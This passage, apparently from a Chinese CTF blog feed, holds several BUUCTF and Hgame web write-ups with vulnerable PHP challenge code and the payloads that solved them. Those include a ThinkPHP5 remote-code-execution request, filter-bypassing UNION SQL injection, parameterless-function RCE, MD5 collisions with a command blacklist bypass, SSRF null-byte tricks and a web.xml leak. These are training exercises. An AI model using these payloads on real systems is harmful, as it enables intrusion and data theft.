operator">=</span><span class="token operator">></span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$$x</span> <span class="token operator">=</span> <span class="token variable">$y</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$$x</span> <span class="token operator">=</span> <span class="token variable">$$y</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token variable">$x</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$x</span> <span class="token operator">!==</span> <span class="token single-quoted-string string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token variable">$handsome</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token variable">$yds</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token single-quoted-string string">'flag'</span>  <span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token single-quoted-string string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token variable">$is</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"the flag is: "</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>     </span></code></pre></code></pre><p>变量覆盖<br>GET和POST flag才会执行最后的输出，可是这样就吧<code>$flag</code>给覆盖了  </p><p>可以将<code>$yds</code>覆盖成<code>$flag</code>借助<code>$$x = $$y;</code>       </p><h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><p>payload1：GET  <code>?yds=flag</code>       </p><p>payload2:GET   <code>?is=flag&amp;flag=flag</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题034</title>
    <link href="/2021/02/22/BUU034/"/>
    <url>/2021/02/22/BUU034/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[安洵杯 2019]easy_web<img src="https://ae03.alicdn.com/kf/U37981b99273b48eda811753994099f30i.jpg" alt="01.png">    </p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>照例查看源代码<br>发现个图片base64，解码后就是左上角那个图<br>url中有一段可疑字符串<code>TXpVek5UTTFNbVUzTURabE5qYz0</code>应该是base64吧，尝试解码，但解不出来，别的编码？看wp后就是base64啊？？—–加个等号—解出来了<br>还是base64，再解，然后是<code>hex</code>解码——得到<code>555.png</code>那个图片的名字<br>这样的话就可以用此方法读取文件了<br>读取<code>index.php</code>  </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ALL</span> <span class="token operator">||</span> <span class="token operator">~</span> <span class="token constant">E_NOTICE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/[^a-zA-Z0-9.]+/"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;img src ="./ctf3.jpeg">'</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"xixi～ no flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;img src='data:image/gif;base64,"</span> <span class="token punctuation">.</span> <span class="token variable">$txt</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"'>&lt;/img>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|>/i"</span><span class="token punctuation">,</span> <span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"forbid ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> `<span class="token variable">$cmd</span>`<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token double-quoted-string string">"md5 is funny ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>         </code></pre>```html&lt;html&gt;&lt;style&gt;  body&#123;   background:url(./bj.png)  no-repeat center center;   background-size:cover;   background-attachment:fixed;   background-color:#CCCCCC;&#125;&lt;/style&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;     ```       </code></pre><p>一个MD5的强比较       </p><pre><code>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2      </code></pre><p>过滤了一些命令和符号       </p><h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><p>payload：<code>dir /</code><img src="https://sc02.alicdn.com/kf/Uf896e48951dd4e559b0696b426dbe15d3.jpg" alt="02.png"><br>发现flag<br>读取：<code>ca\t /f\lag</code><img src="https://ae03.alicdn.com/kf/U73764e1722564e7083cc37a1d9f04b3cE.jpg" alt="03.png"><br><strong>但是</strong><br><code>|\\|\\\\|</code><br><code>\</code>不是被过了么？<br>一个大佬的解释：这个正则是放在PHP里的，要经过两层解析器<br>PHP:第一个<code>\</code>转义了第二个；第三个转义第四个；第五个转义第六个——&gt;<code>|\|\\|</code><br>正则：转义成上面那样，那匹配的就是<code>|\</code>了，而不仅仅是<code>\</code><br><a href="https://www.jianshu.com/p/076c5b422c96">MORE</a>    </p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题033</title>
    <link href="/2021/02/21/BUU033/"/>
    <url>/2021/02/21/BUU033/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[BJDCTF 2nd]old-hack<br><img src="https://sc02.alicdn.com/kf/U3c7ce5b5640949679951f516bed1b102h.jpg" alt="01.png">    </p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>看到<code>THINKPHP5</code>想到之前在攻防世界上的一道THINKPHP的漏洞<br><code>? s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=xxxxx（命令）</code><br>但这里好像不是<br>看wp      </p><h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><p>payload：<code>_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</code><br>POST<br><img src="https://ae02.alicdn.com/kf/Uea8483337ea24698bf907efa1111af7bw.jpg" alt="02.png"><br>成功执行<br>然后找flag即可      </p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p><a href="https://xz.aliyun.com/t/3845">知识点</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hgameweek2</title>
    <link href="/2021/02/17/hgameweek2/"/>
    <url>/2021/02/17/hgameweek2/</url>
    
    <content type="html"><![CDATA[<h2 id="LazyDogR4U"><a href="#LazyDogR4U" class="headerlink" title="LazyDogR4U"></a>LazyDogR4U</h2><p><img src="https://sc04.alicdn.com/kf/H8e78f14012ee46188cad7f4cfdbcb8bev.jpg" alt="01.png"></p><p>dirsearch扫出<code>www.zip</code><br>主要的：<br><code>flag.php</code>:         </p><pre><code>&lt;?phpsession_start();require_once &#39;lazy.php&#39;;if(!isset($_SESSION[&#39;username&#39;]))&#123;    die(&#39;您配吗？&#39;);&#125;?&gt;  &lt;?php    if($_SESSION[&#39;username&#39;] === &#39;admin&#39;)&#123;        echo &quot;&lt;h3 style=&#39;color: white&#39;&gt;admin将于今日获取自己忠实的flag&lt;/h3&gt;&quot;;        echo &quot;&lt;h3 style=&#39;color: white&#39;&gt;$flag&lt;/h3&gt;&quot;;    &#125;else&#123;        if($submit == &quot;getflag&quot;)&#123;            echo &quot;&lt;h3 style=&#39;color: white&#39;&gt;&#123;$_SESSION[&#39;username&#39;]&#125;接近了问题的终点&lt;/h3&gt;&quot;;        &#125;else&#123;            echo &quot;&lt;h3 style=&#39;color: white&#39;&gt;篡位者占领了神圣的页面&lt;/h3&gt;&quot;;        &#125;    &#125;        ?&gt;    </code></pre><p>要想得到flag，username===admin<br><code>flag.php</code>包含了<code>lazy.php</code>         </p><p><code>lazy.php</code>:      </p><pre><code>&lt;?php$filter = [&quot;SESSION&quot;, &quot;SEVER&quot;, &quot;COOKIE&quot;, &quot;GLOBALS&quot;];// 直接注册所有变量，这样我就能少打字力，芜湖~foreach(array(&#39;_GET&#39;,&#39;_POST&#39;) as $_request)&#123;    foreach ($$_request as $_k =&gt; $_v)&#123;        foreach ($filter as $youBadBad)&#123;            $_k = str_replace($youBadBad, &#39;&#39;, $_k);        &#125;        $&#123;$_k&#125; = $_v;    &#125;&#125;         </code></pre><p>第一个循环，将GET和POST得到的数据给<code>$_request</code><br>第二个循环，将键值分别赋给<code>$_k</code>和<code>$_v</code><br>第三个循环，过滤<code>$filter</code>中的词<br>传入<code>username=admin</code><br>经过<code>$&#123;$_k&#125; = $_v</code>,就成了<code>$username=admin</code><br>给的wp中是<code>_SESSISESSIONON[username]=admin</code><br>经过<code>lazy.php</code>后是<code>$_SESSION=$_v</code>而<code>$_v</code>是一个数组，<code>array(1) &#123; [&quot;username&quot;]=&gt; string(5) &quot;admin&quot; &#125;</code><br>所以<code>$_SESSION[username]=admin</code>达到变量覆盖            </p><p>至于wp中所说的，键不能带引号：   </p><pre><code>&lt;?php$A=[&quot;&#39;lisi&#39;&quot;=&gt;15,&quot;zhangsan&quot;=&gt;11];var_dump($A[&#39;lisi&#39;]);?&gt;  </code></pre><p>这样一串代码，输出的是<code>NULL</code>,而<code>var_dump(zhangsan)</code>是可以正常输出的        </p><p><a href="https://www.cnblogs.com/xiaozi/p/7768580.html">变量覆盖</a>     </p><h2 id="200OK"><a href="#200OK" class="headerlink" title="200OK!!"></a>200OK!!</h2><p><img src="https://sc04.alicdn.com/kf/H5e86506d64a6482dbf4a1e7e31d70405r.jpg" alt="02.png"><br>点击<code>Reload</code>可以在开发工具的网络中发现一个<code>server.php</code><br>抓包<br>在js中发现页面的不同显示是status不同的数字<br>在请求头中加入status，使其等于不同数值，即可回显不同信息<br><code>status:  1&#39;</code>没有回显，加上<code>#</code>正常<br>存在SQL注入—–单引号<br>有过滤<code> [&#39;select&#39;, &#39;SELECT&#39;, &#39;from&#39;, &#39;FROM&#39;, &#39;union&#39;, &#39;UNION&#39;, &#39;where&#39;, &#39;WHERE&#39;, &#39; &#39;]</code><br>可以用异或检验：   </p><pre><code>1^1=00^0=01^0=10---------&gt;HTTP 200 OK       1---------&gt;NETWORK ERROR        </code></pre><p><code>1^if(length(&#39;select&#39;)&gt;1,1,0)#</code>返回的是NETWORK ERROR<br>双写可以绕过，或者改字母大小写；空格用<code>/**/</code>代替，或者括号将语句括起来<br><code>-1&#39;/**/ununionion/**/selselectect/**/database()#</code>库名—–&gt;week2sqli<br><code>-1&#39;/**/ununionion/**/selselectect/**/group_concat(table_name)/**/frOm/**/information_schema.tables/**/wHere/**/table_schema=&#39;week2sqli&#39;#</code>表名———–&gt;<code>f1111111144444444444g</code>,<code>status</code><br><code>-1&#39;/**/ununionion/**/selselectect/**/group_concat(column_name)/**/frOm/**/information_schema.columns/**/wHere/**/table_name=&#39;f1111111144444444444g&#39;#</code>列——–&gt;<code>ffffff14gggggg</code><br><code>-1&#39;/**/ununionion/**/selselectect/**/group_concat(ffffff14gggggg)/**/frOm/**/f1111111144444444444g#</code>字段———-&gt;<code>hgame&#123;Con9raTu1ati0n5+yoU_FXXK~Up-tH3,5Q1!!=)&#125;</code>        </p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题032</title>
    <link href="/2021/02/15/BUU032/"/>
    <url>/2021/02/15/BUU032/</url>
    
    <content type="html"><![CDATA[<h2 id="三十二、"><a href="#三十二、" class="headerlink" title="三十二、"></a>三十二、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[GXYCTF2019]禁止套娃<img src="https://ae02.alicdn.com/kf/Hbb3da855d0da4bca8aaa3e2113c5f09bo.jpg" alt="01.png">    </p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>源码什么也没有，<code>robots.txt、www.zip、index.phps</code>都没有，然后扫目录，也没有什么<br>看WP吧<br><code>/.git</code>泄露？？？？？？<br>为什么我扫不出来，而且<code>GitHack</code>后什么也没有？？？？<br>…………………..<br>泄露的源码：        </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"flag在哪里呢？&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token single-quoted-string string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/[a-z,_]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// echo $_GET['exp'];</span>                @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"还差一点哦！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"再好好想想！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"还想读flag，臭弟弟！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// highlight_file(__FILE__);</span><span class="token delimiter important">?></span></span>      </code></pre></code></pre><p>第一个if,过滤了伪协议<br>第二个if，要求不能有参数，<code>(?R)</code>表示引用当前表达式，多一个<code>?</code>表示可以引用，也可以不引用；这里也就是可以配<code>a()、ab(a())....</code>  <img src="https://sc01.alicdn.com/kf/H818b4a1c2aca431a8c533aac17b5aae1P.jpg" alt="04.png"><br>第三个if，匹配一些字符<br>$exp中不能含参<br>首先扫描目录中的文件<br><code>scandir(&#39;.&#39;)</code> ，需要构造个点儿<br><code>localeconv()</code>函数会返回包含本地数字及货币格式信息的数组，数组的第一项就是点；<code>current()</code>函数返回数组当前单元，默认为第一项<br>payload：<code>print_r(scandir(current(localeconv())));</code><br><img src="https://ae03.alicdn.com/kf/Hd1cc742391d04c5cb7bcc3d02f1762521.jpg" alt="02.png"><br>接下来读取<code>flag.php</code><br>et被过了，可以用<code>highlight_file</code><br><code>next()</code>函数可以读取数组中的下一个,但next不能套next<br><code>array_resverse()</code>可以现将数组反转<br>然后读取第二个            </p><h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><p>payload：<code>?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));</code><img src="https://sc01.alicdn.com/kf/H2d0db781d3f84faaa4dea78920f250dda.jpg" alt="03.png">    </p><hr><p>解法二<br><code>arry_flip()</code>函数，交换数组的键和值<br><code>arry_rand()</code>函数，从数组中随机取出一个或多个单元<br>payload：<code>?exp=highlight_file(array_rand(array_flip(scandir(current(localeconv())))));</code><br>解法三<br>使用session<br><code>session_start()</code>开启<br><code>session_id()</code>获取当前的session id<br>需要手动设置<code>Cookie: PHPSESSID=flag.php</code><br><img src="https://ae02.alicdn.com/kf/Hf6e429eef7934a1b919a3e129bed795ec.jpg" alt="05.png">        </p><p>###知识点<br><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE">无参数RCE</a>  </p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题031</title>
    <link href="/2021/02/14/BUU031/"/>
    <url>/2021/02/14/BUU031/</url>
    
    <content type="html"><![CDATA[<h2 id="三十一、"><a href="#三十一、" class="headerlink" title="三十一、"></a>三十一、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[GKCTF2020]cve版签到<img src="https://ae04.alicdn.com/kf/Hd6f117af6427409b82e72633a23c23f80.jpg" alt="01.png">        </p><p><img src="https://ae04.alicdn.com/kf/H28029521cc6044938bd53bc4f26855ec2.jpg" alt="02.png">         </p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>hint中应该是一个漏洞编号，百度一下<img src="https://ae02.alicdn.com/kf/H6eef43faf302452385b72f1c2a050747z.jpg" alt="03.png"><br>看下PHP版本  <img src="https://ae02.alicdn.com/kf/H5ef7d07828da403f95bf00e6b8b83553n.jpg" alt="04.png"><br>符合<br>看一下<code>127.0.0.1</code>,但用<code>\ 0</code>截断没回显，换成<code>%00</code>即可<img src="https://ae02.alicdn.com/kf/H1edfc2e6326f4b59bce8ef6367469123v.jpg" alt="05.png"><br>host结尾必须是123，将1改为123即可      </p><h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><p>payload：<code>?url=http://127.0.0.123%00www.ctfhub.com</code><br><img src="https://sc02.alicdn.com/kf/H23cec03d1a224fbf91a96bd93d2d4631t.jpg" alt="06.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题030</title>
    <link href="/2021/02/13/BUU030/"/>
    <url>/2021/02/13/BUU030/</url>
    
    <content type="html"><![CDATA[<h2 id="三十、"><a href="#三十、" class="headerlink" title="三十、"></a>三十、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[RoarCTF 2019]Easy Java<br><img src="https://ae03.alicdn.com/kf/H06f76bd90727420d9a893f3f4a243f6c6.jpg" alt="01.png">          </p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>题目是easy Java，对Java的了解不是很多<br>help点击后的页面是<img src="https://ae04.alicdn.com/kf/Had5c3fd12baf421f8b1023f21b324039V.jpg" alt="02.png"><br>看wp说改为以POST方式，得到一个word文件，但没啥用<br>考点：<code>WEB-INF/web.xml</code>泄露          </p><h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><p><code>filename=WEB-INF/web.xml</code>提交得到文件<img src="https://ae04.alicdn.com/kf/H22b1b111c74341ed9855f318ce43b62ba.jpg" alt="03.png"><br>在文件中发现flag相关的路径<code>/Flag</code><img src="https://ae02.alicdn.com/kf/H956a300f54424ef691634d55c4389913L.jpg" alt="04.png"><br>访问，得到路径<img src="https://ae03.alicdn.com/kf/H1309e326ea0b42e395c89b6a17a516cak.jpg" alt="05.png"><br>这个和刚才文件里的<code>FlagController</code>的完整类名一样，只不过<code>/</code>换成<code>.</code><br>提交<code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code>得到文件，发现一串base64，解码得到flag<img src="https://ae03.alicdn.com/kf/H5c274b3ec4a7496684b8bc36509309af6.jpg" alt="06.png">     </p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li>WEB-INF/web.xml泄露<br><img src="https://ae02.alicdn.com/kf/H675a2d221b8c489b8ceae6abde6a176dX.jpg" alt="07.png">        </li><li>Java web工程目录结构<br><img src="https://ae03.alicdn.com/kf/H02fb99991afc4e9a8f4d9c7e395a1fa6G.jpg" alt="08.png">     </li><li>servlet访问URL映射配置    </li><li>Servlet（Server Applet）是Java Servlet的简称，称为小服务程序或服务连接器，用Java编写的服务器端程序，具有独立于平台和协议的特性，主要功能在于交互式地浏览和生成数据，生成动态Web内容。            </li><li>狭义的Servlet是指Java语言实现的一个接口，广义的Servlet是指任何实现了这个Servlet接口的类，一般情况下，人们将Servlet理解为后者。Servlet运行于支持Java的应用服务器中。从原理上讲，Servlet可以响应任何类型的请求，但绝大多数情况下Servlet只用来扩展基于HTTP协议的Web服务器。        </li><li>由于客户端是通过URL地址访问Web服务器中的资源，所以Servlet程序若想被外界访问，必须把Servlet程序映射到一个URL地址上，这个工作在web.xml文件中使用<servlet>元素和<servlet-mapping>元素完成。<servlet>元素用于注册Servlet，它包含有两个主要的子元素：<servlet-name>和<servlet-class>，分别用于设置Servlet的注册名称和Servlet的完整类名。一个<servlet-mapping>元素用于映射一个已注册的Servlet的一个对外访问路径，它包含有两个子元素：<servlet-name>和<url-pattern>，分别用于指定Servlet的注册名称和Servlet的对外访问路径，如：</li></ul><p><img src="https://ae04.alicdn.com/kf/He9286c2954d14cf28a02afe6f7531d1ah.jpg" alt="09.png">        </p><p><a 